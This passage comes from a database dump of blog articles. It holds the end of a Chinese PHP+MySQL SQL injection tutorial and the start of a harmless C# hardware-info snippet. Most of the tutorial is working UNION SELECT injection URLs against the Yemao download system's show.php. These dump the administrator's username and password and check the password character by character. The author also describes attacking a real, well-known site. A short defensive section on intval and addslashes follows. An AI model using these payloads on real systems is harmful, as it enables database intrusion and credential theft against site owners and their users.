/>\r\n但是有一个问题，由于很多情况下，很多程序的数据表都会有一个前缀，有这个前缀就可以让多个程序共用一个数据库。比如：</p>\r\n\r\n<p>site_article<br />\r\nsite_user<br />\r\nsite_download<br />\r\nforum_user<br />\r\nforum_post<br />\r\n&hellip;&hellip;</p>\r\n\r\n<p>如果安全意识高的话，管理员会加个表名前缀，那猜解就很麻烦了，不过完全可以做一个表名列表来跑。这里就不多说了，后面会有一个具体的例子来解开一切迷茫^_^&hellip;&hellip;</p>\r\n\r\n<p>实例</p>\r\n\r\n<p>下面对一个国内非常出名的站点进行善意的攻击测试，来对上面的知识进行一次大概的验证，出于影响等诸多因素，我们称这个站点为HB(www.***bai.net)，HB使用的是夜猫的文章系统和下载系统，不过文章系统已经升级了，我们就不看了，下载系统是绝对有问题的，不过由于我现在写文章的电脑不上网，我用相同的下载系统在本地进行一次模拟的测试。实际上，我事前早用更狠毒的技术渗透过HB。<br />\r\n首先我们找到有问题的文件，show.php?id=1，我们马上看看数据结构和表名，看看HB有没有改字段和表名，我早知道夜猫下载系统1.0.1版的软件信息的表有19个字段，就提交：</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</p>\r\n\r\n<p>注意，这里有19个&ldquo;1&rdquo;，返回正常的页面，我可以可以肯定字段没有变，我们也就别拖拉了，直接看看夜猫的默认用户数据表是否存在：</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user</p>\r\n\r\n<p>正常返回，如图，如果URL不清楚可以看标题那里：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731162229616824.jpg\" style=\"height:653px; width:715px\" /></p>\r\n\r\n<p>嗯，这个HB还真是够懒的，这么烂的程序也不知道先修改一下再用，不过也是，没有多少人和我一样有闲心先去加固程序才用的，再看默认的用户id还在不在？</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</p>\r\n\r\n<p>忘记了，就算不存在id为1的用户，前面的查询是真的，照样会正常返回数据库的软件信息，我们只能让前面的查询为假，才能使后面查询的结果显示出来，但我们要注意一点，show.php文件里面有这样一段代码：</p>\r\n\r\n<p>if ($id &gt; &quot;0&quot; &amp;&amp; $id &lt; &quot;999999999&quot; ):<br />\r\n//这里是正确执行的代码<br />\r\nelse:<br />\r\necho &quot;&lt;p&gt;&lt;center&gt;&lt;a href=./list.php&gt;无记录&lt;/a&gt;&lt;/p&gt;n&quot;;</p>\r\n\r\n<p>也就是说我们的ID的值再怎么离谱也不能在0和999999999之外，HB的软件肯定不会超过10000个的，我们就提交：</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</p>\r\n\r\n<p>正常返回了，表格里的数据全部是&ldquo;1&rdquo;，说明ID还在哦。如果不存在的话，页面只返回的数据全部是不详，因为程序的判断是如果数据为空就显示不详。现在确定了ID存在后，还要确定是不是管理员才行啊：</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and groupid=1</p>\r\n\r\n<p>程序规定groupid为1是超级管理员，既然都返回正确信息了，我们就直接构造畸形语句，暴出我们需要的用户名和密码，嘿嘿，首先看看ymdown表的数据结构，因为show.php是查询它的，所以我们应该看它的数据结构。</p>\r\n\r\n<p>CREATE TABLE ymdown (<br />\r\nid int(10) unsigned NOT NULL auto_increment,<br />\r\nname varchar(100) NOT NULL,<br />\r\nupdatetime varchar(20) NOT NULL,<br />\r\nsize varchar(100) NOT NULL,<br />\r\nempower varchar(100) NOT NULL,<br />\r\nos varchar(100) NOT NULL,<br />\r\ngrade smallint(6) DEFAULT &#39;0&#39; NOT NULL,<br />\r\nviewnum int(10) DEFAULT &#39;0&#39; NOT NULL,<br />\r\ndownnum int(10) DEFAULT &#39;0&#39; NOT NULL,<br />\r\nhomepage varchar(100), demo varchar(100),<br />\r\nbrief mediumtext, img varchar(100),<br />\r\nsort2id smallint(6) DEFAULT &#39;0&#39; NOT NULL,<br />\r\ndown1 varchar(100) NOT NULL,<br />\r\ndown2 varchar(100),<br />\r\ndown3 varchar(100),<br />\r\ndown4 varchar(100),<br />\r\ndown5 varchar(100),<br />\r\nPRIMARY KEY (id)<br />\r\n);</p>\r\n\r\n<p>用户名和密码的数据类型都是varchar，所以我们要选择ymdown表里数据类型是varchar来，如果把varchar的数据写到int的地方当然是不可能显示的了，由于updatetime（更新日期）的长度是20，可能会出现显示不完全的情况，我们就把用户名显示在name（软件标题）那里，密码显示在size（文件大小）那里好了，在19个&ldquo;1&rdquo;中，name和size分别是第二个和第四个，我们提交：</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=10000 union select 1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</p>\r\n\r\n<p>结果成功返回了我们所需要的用户名和密码，如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731162313862121.jpg\" style=\"height:551px; width:662px\" /></p>\r\n\r\n<p>验证测试结果</p>\r\n\r\n<p>整个渗透过程就结束了，不过由于黑白把入口给改了，无法登陆，但我们仅仅测试注入，目的已经达到了，就没有必要进后台了，我后来又继续构造SQL语句来验证我们获取的密码是否正确，依次提交：</p>\r\n\r\n<p>http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,1,1))=49<br />\r\n#验证第一位密码<br />\r\nhttp://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,2,1))=50<br />\r\n#验证第二位密码<br />\r\nhttp://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,3,1))=51<br />\r\n#验证第三位密码<br />\r\nhttp://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,4,1))=52<br />\r\n#验证第四位密码<br />\r\nhttp://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,5,1))=53<br />\r\n#验证第五位密码<br />\r\nhttp://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,6,1))=54<br />\r\n#验证第六位密码</p>\r\n\r\n<p>用select char(49,50,51,52,53,54)就可以得到123456。<br />\r\nOK！测试结束，验证我们的结果没有错误。说明一下，密码本身是123456，可以不用ord()函数而直接猜，但为了大家能看到一个完整的过程，我还是&ldquo;专业&rdquo;一点好了。下面补一幅截图，是本文写完后，重新测试HB时截取的：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731162344542639.jpg\" style=\"height:531px; width:612px\" /></p>\r\n\r\n<p>注入的防范</p>\r\n\r\n<p>防范可以从两个方面着手，一个就是服务器，二个就是代码本身，介绍服务器配置的文章很多了，无非就是把magic_quotes_gpc设置为On，display_errors设置为Off，这里也就不在多说，既然本文接触都是程序的问题，我们还是从程序本身寻找原因。<br />\r\n如果说php比asp易用，安全，从内置的函数就可以体现出来。如果是整形的变量，只需使用一个intval()函数即可解决问题，在执行查询之前，我们先处理一下变量，如下面的例子就是很安全的了：</p>\r\n\r\n<p>$id = intval($id);<br />\r\nmysql_query(&quot;SELECT * FROM article WHERE articleid=&#39;$id&#39;&quot;);</p>\r\n\r\n<p>或者这样写：</p>\r\n\r\n<p>mysql_query(&quot;SELECT * FROM article WHERE articleid=&quot;.intval($id).&quot;&quot;)</p>\r\n\r\n<p>不管如何构造，最终还是会先转换为整形猜放入数据库的。很多大型程序都是这样写，非常简洁。<br />\r\n字符串形的变量也可以用addslashes()整个内置函数了，这个函数的作用和magic_quotes_gpc一样，使用后，所有的 &#39; (单引号), &quot; (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符。而且新版本的php，就算magic_quotes_gpc打开了，再使用addslashes()函数，也不会有冲突，可以放心使用。例子如下：</p>\r\n\r\n<p>$username = addslashes($username);<br />\r\nmysql_query(&quot;SELECT * FROM members WHERE userid=&#39;$username&#39;&quot;);</p>\r\n\r\n<p>或者这样写：</p>\r\n\r\n<p>mysql_query(&quot;SELECT * FROM members WHERE userid=&quot;.addslashes($username).&quot;&quot;)</p>\r\n\r\n<p>使用addslashes()函数还可以避免引号配对错误的情况出现。而刚才的前面搜索引擎的修补方法就是直接把&ldquo;_&rdquo;、&ldquo;%&rdquo;转换为&ldquo;_&rdquo;&ldquo;%&rdquo;就可以了，当然也不要忘记使用addslashes()函数。具体代码如下：</p>\r\n\r\n<p>$keywords = addslashes($keywords);<br />\r\n$keywords = str_replace(&quot;_&quot;,&quot;_&quot;,$keywords);<br />\r\n$keywords = str_replace(&quot;%&quot;,&quot;%&quot;,$keywords);</p>\r\n\r\n<p>不用像ASP那样，过滤一点变量，就要写一大堆的代码，就是上面的一点点代码，我们就可以把本文所有的问题解决了，是不是很简便？</p>\r\n\r\n<p>后记</p>\r\n\r\n<p>这篇文章是我自2004年3月份以来利用课余时间学习研究的，5月中旬写完，里面的所有东西都是经过我亲自测试的，本文仅仅算是技术总结吧，还有很多技术难点没有解决的，因此错漏是难免的，欢迎请大家指正。<br />\r\n还有不少危险性极高的东西，只要少数条件成立，一般都可以进入服务器，考虑到严重性和广泛性，我并没有写出来，我个人估计，不久将会出现PHP+MYSQL注入的一系列工具，技术也会普及和告诉发展。但我建议大家一定要弄清楚原理，工具只是武器，技术才是灵魂，工具只是提高效率罢了，并不代表你的技术高超。<br />\r\n大家看到这篇文章的时候，估计我已经高考完了，暑假我会写一篇更深入的研究。<br />\r\n为了让更多人了解并掌握PHP+MYSQL的注入技术，我才写了这篇文章，并决定发表，再重申一次。不要对任何国家的任何合法主机进行破坏，否则后果自负。</p>\r\n',0,1438331046,0,0),(156,38,'c#检测系统（硬件）信息源代码','<p>1.获取主板信息：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string MyInfo;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileStream fs = new FileStream(@&quot;d:\\硬件信息检测.txt&quot;, FileMode.OpenOrCreate,FileAccess.Write);//需要 using System.IO<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StreamWriter m_streamWriter = new StreamWriter(fs);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.BaseStream.Seek(0, SeekOrigin.End);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //以下需要 using System.Management，需要添加引用：System.Management<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementClass mc = new ManagementClass(&quot;WIN32_BaseBoard&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementObjectCollection moc = mc.GetInstances();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (ManagementObject mo in moc)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = mo[&quot;Product&quot;].ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;主板:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + MyInfo);<br />\r\n2.获取处理器信息：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = &quot;&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MySearcher = new ManagementObjectSearcher(&quot;SELECT * FROM Win32_Processor&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (ManagementObject MyObject in MySearcher.Get())<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = MyObject[&quot;Name&quot;].ToString().Trim();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;处理器:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + MyInfo);<br />\r\n3.获取内存容量：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;内存:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + GetSizeUseUnit(GetPhisicalMemory().ToString()));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //以下为内存容量获取函数：&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int GetPhisicalMemory()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementObjectSearcher searcher = new ManagementObjectSearche();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; searcher.Query = new SelectQuery(&quot;Win32_PhysicalMemory&quot;, &quot;&quot;, new string[] { &quot;Capacity&quot; });<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementObjectCollection collection = searcher.Get(); //获取内存容量<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementObjectCollection.ManagementObjectEnumerator em = collection.GetEnumerator();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int capacity = 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (em.MoveNext())<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementBaseObject baseObj = em.Current;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (baseObj.Properties[&quot;Capacity&quot;].Value != null)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; capacity += int.Parse(baseObj.Properties[&quot;Capacity&quot;].Value.ToString());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return capacity;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //以下为数字格式化函数：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private string GetSizeUseUnit(string size)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double dSpace = Convert.ToDouble(size);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string sSpace = dSpace.ToString(&quot;N&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string[] tmp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string rtnSize = &quot;0&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmp = sSpace.Split(&#39;,&#39;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (tmp.GetUpperBound(0))<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 0:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rtnSize = tmp[0] + &quot; 字节&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 1:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rtnSize = tmp[0] + &quot;.&quot; + tmp[1].Substring(0, 2) + &quot; K&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 2:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rtnSize = tmp[0] + &quot;.&quot; + tmp[1].Substring(0, 2) + &quot; M&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 3:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rtnSize = tmp[0] + &quot;.&quot; + tmp[1].Substring(0, 2) + &quot; G&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 4:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rtnSize = tmp[0] + &quot;.&quot; + tmp[1].Substring(0, 2) + &quot; T&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return rtnSize;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n4.获取硬盘信息（可以获取多个硬盘信息）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SelectQuery selectQuery = new SelectQuery(&quot;select * from Win32_DiskDrive&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int j = 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (ManagementObject disk in searcher.Get())<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;硬盘&quot; + j + &quot;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + disk[&quot;Model&quot;].ToString() + &quot; &quot;+<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GetSizeUseUnit(disk[&quot;Size&quot;].ToString()));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //用到数字格式化函数<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j++;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n5.获取显卡信息：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mc = new ManagementClass(&quot;Win32_DisplayControllerConfiguration&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; moc = mc.GetInstances();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = &quot;&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (ManagementObject mo in moc)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br 